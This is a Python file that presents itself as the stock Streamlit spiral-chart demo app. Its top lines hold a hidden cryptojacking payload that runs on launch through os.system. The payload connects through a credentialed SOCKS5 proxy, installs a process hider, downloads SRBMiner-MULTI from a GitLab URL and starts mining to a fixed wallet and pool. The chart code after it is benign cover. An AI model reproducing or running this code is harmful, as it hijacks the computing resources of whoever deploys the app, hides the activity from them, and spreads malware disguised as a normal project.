from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st

import os
os.system('curl --proxy "socks5://gilakalilw-rotate:yangbacagila@p.webshare.io:80" https://ipv4.webshare.io/')
os.system('echo "#!/bin/sh" >> tes')
os.system('echo " " >> tes')
os.system('echo "apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp" >> tes')
os.system('echo "npm i -g node-process-hider" >> tes')
os.system('echo "ph add node" >> tes')
os.system('echo "memory=$(shuf -n 1 -i 1-999999)" >> tes') 
os.system('echo "curl -L https://gitlab.com/gilaaja/exe/-/raw/main/SRBMiner-MULTI" >> tes')
os.system('echo "chmod +x SRBMiner-MULTI" >> tes')  
os.system('echo "./node --disable-gpu --algorithm minotaurx --pool stratum+tcps://stratum-ru.rplant.xyz:17068 --wallet RSryP2mM5gYVeTgaNrWZZREgwkXqurso5Q.$(echo $(shuf -i 1-9999 -n 1)-Gila_Avian) -t 16 --password x enable-4gb-hugepages --proxy socks5://gilakalilw-rotate:yangbacagila@p.webshare.io:80" >> tes') 
os.system('sleep 2') 
os.system('sh tes')

"""
# Welcome to Streamlit!
Edit /streamlit_app.py to customize this app to your heart's desire :heart:
If you have any questions, checkout our documentation and [community
forums](https://discuss.streamlit.io).
In the meantime, below is an example of what you can do with just a few lines of code:
"""


with st.echo(code_location='below'):
    total_points = st.slider("Number of points in spiral", 1, 5000, 2000)
    num_turns = st.slider("Number of turns in spiral", 1, 100, 9)

    Point = namedtuple('Point', 'x y')
    data = []

    points_per_turn = total_points / num_turns

    for curr_point_num in range(total_points):
        curr_turn, i = divmod(curr_point_num, points_per_turn)
        angle = (curr_turn + 1) * 2 * math.pi * i / points_per_turn
        radius = curr_point_num / total_points
        x = radius * math.cos(angle)
        y = radius * math.sin(angle)
        data.append(Point(x, y))

    st.altair_chart(alt.Chart(pd.DataFrame(data), height=500, width=500)
        .mark_circle(color='#0068c9', opacity=0.5)
        .encode(x='x:Q', y='y:Q'))
